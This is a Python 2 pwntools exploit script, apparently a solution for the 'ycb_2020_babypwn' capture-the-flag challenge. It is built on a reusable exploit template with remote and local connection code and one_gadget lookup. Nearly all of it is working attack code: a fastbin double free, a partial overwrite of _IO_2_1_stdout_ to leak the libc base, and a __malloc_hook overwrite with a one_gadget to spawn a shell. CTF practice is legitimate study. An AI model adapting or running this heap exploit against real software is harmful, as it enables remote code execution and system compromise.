#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./ycb_2020_babypwn"                                   # 本地ELF
    pro_libc = "libc-2.23_64.so"       # Libc文件
    rem_libc = "libc-2.23_64.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)

def malloc(size,name,content):
    ru(":")
    sl("1")
    ru(":")
    sl(str(size))
    ru(":")
    sd(name)
    ru(":")
    sl(content)

def delete(idx):
    ru(":")
    sl("2")
    ru(":")
    sl(str(idx))

def exp():
    malloc(0x68,p64(0x71),'a'*0x10)# 0
    malloc(0x68,'b'*0x10,'b'*0x10)# 1
    delete(0)
    delete(1)
    delete(0)

    malloc(0x68,'\x90','a'*0x10) # 2
    malloc(0x68,'a'*0x20+p64(0x70)+p64(0x51),'b'*0x10) # 3
    malloc(0x68,'\x00'*0x50+p64(0)+p64(0x71),'c'*0x10) # 4
    malloc(0x68,p64(0)+p64(0x31)+p64(0)*5+p64(0x71),'a'*0x10) # 5
    malloc(0x20,'p','p') # 6
    delete(3)
    delete(5)
    delete(6)

    malloc(0x68,p64(0)+p64(0x31)+p64(0)*5+p64(0xa1),'a'*0x10) # 7
    delete(3)
    delete(6)
    delete(5)

    malloc(0x68,p64(0)+p64(0x31)+p64(0)*5+p64(0x71)+'\xdd\x25','a'*0x10) # 8
    delete(6)
    malloc(0x68,'a','a'*0x10) # 9
    delete(6)

    ru(":") #  10
    sl("1")
    ru(":")
    sl(str(0x68))
    ru(":")
    sd('a'*0x33+p64(0xfbad1800)+p64(0)*3+'\x00')

    ru("\n")
    rv(0x40)
    _IO_2_1_stdout_=u64(rv(6).ljust(8,'\x00'))+0x20
    info("_IO_2_1_stdout_: "+hex(_IO_2_1_stdout_))
    libc_base=_IO_2_1_stdout_-libc.sym['_IO_2_1_stdout_']
    info("libc_base: "+hex(libc_base))
    ogg_addr=libc_base+0xf1147
    info("one_gadget: "+hex(ogg_addr))
    malloc_hook=libc_base+libc.sym['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))

    sleep(0.3)
    sl('a')

    delete(6)
    malloc(0x68,'a','a') # 11
    delete(0)
    delete(11)
    delete(0)

    delete(6)
    malloc(0x68,p64(malloc_hook-0x23),'a')
    delete(6)
    malloc(0x68,p64(malloc_hook-0x23),'a')
    delete(6)
    malloc(0x68,p64(malloc_hook-0x23),'a')
    delete(6)
    malloc(0x68,'a'*0x13+p64(ogg_addr),'a')


    


    



    # malloc(0x68,,'b'*0x10) # 10




    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
    

